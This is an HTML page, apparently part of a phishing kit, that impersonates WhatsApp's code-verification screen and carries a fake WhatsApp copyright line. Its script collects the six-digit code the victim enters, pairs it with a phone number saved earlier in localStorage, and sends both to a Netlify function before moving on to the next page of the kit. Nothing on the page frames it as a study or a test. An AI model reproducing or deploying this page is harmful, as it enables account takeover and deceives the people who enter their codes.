<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verificación</title>
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #4caf50, #81c784);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #333;
    }

    .code-box {
      background: white;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      width: 350px;
      max-width: 90%;
      text-align: center;
    }

    .code-box h1 {
      margin-bottom: 12px;
      font-weight: 600;
      color: #333;
      font-size: 1.8rem;
    }

    .description {
      font-weight: 400;
      font-size: 1rem;
      color: #555;
      margin-bottom: 28px;
      line-height: 1.4;
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 16px;
      color: #555;
      text-align: left;
      font-size: 1rem;
    }

    .code-inputs {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 24px;
    }

    .code-inputs input {
      width: 40px;
      height: 50px;
      font-size: 1.8rem;
      font-weight: 600;
      text-align: center;
      border: 2px solid #ddd;
      border-radius: 12px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      color: #333;
    }

    .code-inputs input:focus {
      outline: none;
      border-color: #4caf50;
      box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
      background-color: #f0fdf0;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #21c063;
      border: none;
      border-radius: 14px;
      color: white;
      font-weight: 600;
      font-size: 1.1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #1aa454;
    }

    .footer-text {
      margin-top: 24px;
      font-size: 0.9rem;
      color: #555;
      user-select: none;
      line-height: 1.3;
    }

    .footer-text strong {
      display: block;
      margin-bottom: 6px;
    }

    .footer-text a {
      color: #4caf50;
      text-decoration: none;
      font-weight: 600;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="code-box">
    <h1>Valida whatsapp</h1>
    <p class="description">
      Por favor, ingrese el código de 6 dígitos que ha sido enviado a su dispositivo para iniciar la validación.
    </p>

    <form id="codeForm" autocomplete="off">
      <label for="code">Código de verificación</label>
      <div class="code-inputs" aria-label="Código de 6 dígitos">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 1" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 2" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 3" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 4" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 5" />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 6" />
      </div>
      <button type="submit">Verificar</button>
    </form>

    <div class="footer-text" aria-live="polite" aria-atomic="true">
      Además del cifrado de extremo a extremo, añadimos más capas de protección para todas tus conversaciones.<br><br>
      2024 © WhatsApp LLC
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <script>
  const inputs = document.querySelectorAll('#codeForm input[type="text"]');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  function buildMessage(code) {
    let numero = localStorage.getItem('telefono_completo') || 'Número no disponible';
    return {
      numero: numero,
      codigo: code
    };
  }

  $('#codeForm').submit(function(e) {
    e.preventDefault();

    let code = '';
    inputs.forEach(input => {
      code += input.value;
    });

    // Guardar código en localStorage para luego comparar en index3
    localStorage.setItem('codigo_index2', code);

    let data = buildMessage(code);

    // Enviar usando Netlify Function
    fetch('/.netlify/functions/send-code', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        console.log("Código enviado exitosamente");
        // Redirigir a index4.html sin mostrar mensaje
        window.location = "index8.html";
      } else {
        alert('Error enviando el código. Intenta de nuevo.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Error enviando el código. Intenta de nuevo.');
    });
  });
  </script>

</body>
</html>
